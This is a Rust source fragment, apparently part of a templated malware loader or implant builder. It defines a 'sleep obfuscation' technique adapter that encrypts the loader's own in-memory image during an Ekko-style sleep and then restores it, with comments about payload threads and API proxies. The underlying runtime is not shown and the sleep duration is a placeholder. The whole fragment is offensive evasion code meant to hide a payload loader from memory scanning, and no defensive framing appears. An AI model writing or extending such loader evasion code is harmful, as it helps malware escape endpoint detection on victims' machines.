// --- Sleep obfuscation (technique adapter) ---
//
// The mechanism lives in the crate-level `sleep_runtime` block, which the
// `Sleep` API proxy also calls. This step only resolves the loader's own image
// and runs one obfuscated sleep. Keeping the trace here is safe: the pipeline
// runs on the loader's thread, where the debug stub's TLS is provisioned (the
// shared block is deliberately trace-free because proxies run on payload
// threads).

/// Encrypts the loader's own image for `sleep_ms`, then restores it.
pub fn sleep_obfuscation() -> Result<bool, String> {
    let (image_base, image_size) = crate::sleep_runtime::current_image()?;
    crate::tech_dbg!(
        "sleep_obfuscation",
        "sleeping $SLEEP_MS$ ms over the loader image"
    );
    crate::sleep_runtime::ekko_sleep(image_base, image_size, $SLEEP_MS$)?;
    Ok(true)
}
